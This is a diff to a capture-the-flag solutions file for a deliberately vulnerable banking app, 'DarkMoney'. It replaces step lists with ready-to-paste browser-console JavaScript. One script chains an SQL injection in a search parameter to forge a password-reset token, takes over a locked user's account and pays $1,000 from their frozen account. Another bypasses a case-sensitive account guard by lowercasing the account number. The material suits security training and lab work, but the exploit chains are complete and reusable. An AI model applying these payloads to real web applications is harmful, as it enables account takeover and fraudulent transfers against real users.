@@ -186,19 +186,47 @@ Additional challenges are still locked (unlock by completing prerequisites):
 - **Vulnerability:** Broken ownership check — API validates `fromAccountNumber` is owned/linked by current session, but doesn't check if the account owner is locked
 - **Hint:** "An option removed from the screen is not an option forbidden. Find the path the interface does not offer, and fund a bill payment from the account that was told to sit still."
 - **Key insight:** Need to log in AS the account owner (user 5, grahman) to pay from their account — use Second Chances SQLi to reset their password and unlock the LOCKED account
-- **Exact attack chain:**
-  1. SQLi to create password reset token: `GET /api/transactions?search=%25' OR reset_password_token('grahman','Test@DM456!')>'a' OR '1'='`
-  2. Activate reset + unlock account: `POST /api/auth/reset-password` `{"token":"Test@DM456!","password":"Gr4hman@2026!"}` → `{success:true}` (also resets consecutive_failed_attempts, sets status ACTIVE)
-  3. Login as grahman: `POST /api/auth/login` `{"username":"grahman","password":"Gr4hman@2026!"}` → `{success:true,blocked:false}`
-  4. Create bill payee: `POST /api/bill-pay/payees` `{"name":"Illumistrami Holdings","accountIdentifier":"987654321","type":"COMPANY","category":"UTILITIES","nickname":"Illumistrami"}` → payeeId: 12
-  5. Pay from DMACC1005: `POST /api/bill-pay/payments` `{"payeeId":12,"fromAccountNumber":"DMACC1005","amount":1000,"sendDate":"2026-11-10","memo":"payment","schedule":{"frequency":"ONE_TIME"}}` → 200, paymentId: BP-000129
+
+**COPY-PASTE SOLUTION** (run in browser console on DarkMoney tab while logged in as Alice):
+
+```javascript
+// Step 1: SQLi to create a password reset token for grahman
+await fetch('/api/transactions?search=%25%27%20OR%20reset_password_token(%27grahman%27%2C%27Test@DM456!%27)%3E%27a%27%20OR%20%271%27%3D%27', {credentials:'include'})
+
+// Step 2: Activate the reset token (also unlocks the LOCKED account)
+await fetch('/api/auth/reset-password', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token:'Test@DM456!', password:'Gr4hman@2026!'})})
+
+// Step 3: Log in as grahman (session switches to grahman)
+await fetch('/api/auth/login', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({username:'grahman', password:'Gr4hman@2026!'})})
+
+// Step 4: Create a bill payee (note the payeeId returned - you'll need it in step 5)
+let payeeResp = await fetch('/api/bill-pay/payees', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({name:'Illumistrami Holdings', accountIdentifier:'987654321', type:'COMPANY', category:'UTILITIES', nickname:'Illumistrami'})})
+let payee = await payeeResp.json(); console.log('payeeId:', payee.id)
+
+// Step 5: Pay from DMACC1005 (grahman's frozen account) — use payeeId from step 4
+await fetch('/api/bill-pay/payments', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({payeeId: payee.id, fromAccountNumber:'DMACC1005', amount:1000, sendDate:'2026-11-10', memo:'payment', schedule:{frequency:'ONE_TIME'}})})
+// crwd-ctrl auto-detects on success. Log back in as amorgan after: fetch('/api/auth/login', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({username:'amorgan', password:'test@DM123!'})})
+```
+
 - **Proof:** crwd-ctrl auto-detected on the bill pay success response (+200 pts)
 
 ### Mirror Ledger — 250 pts ✅
 - **Vulnerability:** Case-sensitivity mismatch — Java guard uses `String.startsWith("DMACCEXT")` (case-sensitive) but MySQL account lookup is case-insensitive
 - **Hint:** "It rejects the account by its number, matched exactly as written. But the lookup underneath is not so careful."
 - **Key insight:** Send `fromAccountNumber` in lowercase — Java's `startsWith("DMACCEXT")` fails (guard bypassed) but MySQL resolves `dmaccext0001` → `DMACCEXT0001` anyway
-- **Exact request:** `POST /api/bill-pay/payments` `{"payeeId":1,"fromAccountNumber":"dmaccext0001","amount":100,"sendDate":"2026-11-10","memo":"test","schedule":{"frequency":"ONE_TIME"}}` → 200, paymentId: BP-000130
+
+**COPY-PASTE SOLUTION** (run in browser console on DarkMoney tab, logged in as any user linked to DMACCEXT0001):
+
+```javascript
+// First link a shadow/external account if you haven't already (needs a partner bank auth token)
+// If DMACCEXT0001 is already linked to your account, skip to the payment below
+
+// Pay from shadow account using lowercase to bypass case-sensitive guard
+await fetch('/api/bill-pay/payments', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({payeeId:1, fromAccountNumber:'dmaccext0001', amount:100, sendDate:'2026-11-10', memo:'test', schedule:{frequency:'ONE_TIME'}})})
+// crwd-ctrl auto-detects on success
+```
+
+- **Note:** `payeeId:1` is an existing payee. Use `fetch('/api/bill-pay/payees', {credentials:'include'}).then(r=>r.json())` to list your payees.
 - **Proof:** crwd-ctrl auto-detected on the bill pay success response (+250 pts)
 
 ### Things You Were Asked Not to See — 70 pts — Flag: `ROBOTS_ARE_NOT_GUARDS`
